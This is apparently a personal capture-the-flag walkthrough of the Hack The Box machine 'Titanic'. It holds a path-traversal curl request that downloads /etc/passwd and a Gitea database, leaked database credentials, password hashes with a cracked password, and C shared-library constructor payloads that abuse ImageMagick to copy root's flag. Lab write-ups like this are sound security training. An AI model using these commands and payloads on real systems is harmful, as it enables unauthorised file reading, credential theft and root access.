Nmap scan revealed:
22/tcp - open - openSSH 8.9p1 Ubuntu
80/tcp - open - Apache httpd 2.4.52

We get a successful web server with limited functionality. Added the IP to /etc/hosts for titanic.htb

Used whatweb to enumerate services:
└─$ whatweb http://10.129.232.146/
http://10.129.232.146/ [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.232.146], RedirectLocation[http://titanic.htb/], 
Title[301 Moved Permanently]
http://titanic.htb/ [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.129.232.146], JQuery, Python[3.10.12], Script, Title[Titanic - 
Book Your Ship Trip], Werkzeug[3.0.3]
Server is running Werkzeug/3.0.3 and Python/3.10.12

Found /download, /server-status/ and /book with gobuster. /download reveals that a ticket parameter is required. 
Used curl to test it with a different input and got the same "error":ticket not found message
curl -i http://titanic.htb/download?ticket=1234

I attempted an LFI attack using curl and got some good results:
curl -i "http://titanic.htb/download?ticket=../../../../etc/passwd"
  developer:x:1000:1000:developer:/home/developer:/bin/bash
Tried other paths using LFI and no luck. 


Tried enumerating for subdomains and after a while I was able to locate dev.titanic.htb. I add to add this to my hosts file to resolve it.

Opened the browser and was met with Gitea 1.22.1. Seems to be a version control website. I couldn't brute force the developer login,
but I was able to create a user on the platform. 
Gitea potentially vulnerable to CVE-2024-6886 which is an XSS attack.

Metasploit has some modules for RCE on gitea. 

Upon looking around Gitea I found 2 repositories. One for Flask's config and one for the docker container that seems to have a sql database. 
Here's some enumerated information from the repository:

MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
MYSQL_DATABASE: tickets
MYSQL_USER: sql_svc
MYSQL_PASSWORD: sql_password

Mysql is runnng locally on 3306 and only open to localhost.

For gitea's repository I found a volume location:
/home/developer/gitea/data:/data

I realized I could make reposities with my test user. Going to attempt to use webhooks or repository actions to create a reverse shell
since I can't access the sql database from a non-localhost connection.

Got error:
"webook can only call allowed HTTP servers (Check your webhook ALLOWED_HOST_LIST setting), deny

Reverse shell http listener did not work because of this. Trying to find a work-around

gitea stores information on gitea.db so I used the previous download?ticket= LFI path to extract the gitea.db:
curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db

This gave me gitea.db on my local machine which I then opened with sqlite to view the database.
I was able to extract some hashes for administrator and developer from the gitea.db db:
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34

The hash is using PBKDF2. After finding a python script online to crack this hash, the developer password is revealed to be:
25282528

Testing ssh on the developer account gives us a successful ssh login. Found the user flag:
developer@titanic:~$ ls
gitea  mysql  user.txt
developer@titanic:~$ cat user.txt
4177746b466d8f926ec557631ff3974c
developer@titanic:~$

Now with SSH access to the machine, we'll need to find a way to privilege escalate to root.
Upon looking at /opt/scripts I noticed the identify_images.sh file. I used nano to open it and found:

truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >>

This tells me that the server is using magick identify when I asked chatgpt. 
Searched metasploit for modules to exploit image magick.
Found: exploit/unix/fileformat/imagemagick_delegate
attempting to create reverse shell using this module but no success.

Used /usr/bin/magick --version to identify the exact version which is:
imagemagick 7.1.1
This github page has an arbitrary code vulnerability for this version:
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

With the help of chatgpt, I was able to determine that this vulnerability means that because we're able to write to the images directory from before, we can upload a file or folder
that will execute commands as sudo. I'm going to use this exploit to extract and change the permissions of the root flag which is likely root.txt on the root home.

Navigated to:
cd /opt/app/static/assets/images/
created:
nano exploit.c
and put in:
#include <stdio.h>
#include <stdlib.h>

static void exploit() __attribute__((constructor));

void exploit() {
    system("cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt");
}

this then uploaded successfully into the images file. I compiled it with:
gcc -shared -o libexploit.so -fPIC exploit.c
then verified the file existed.
This strategy didn't work, so I ran this directly in the shell:
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt root.txt; chmod 754 root.txt");
    exit(0);
}
EOF



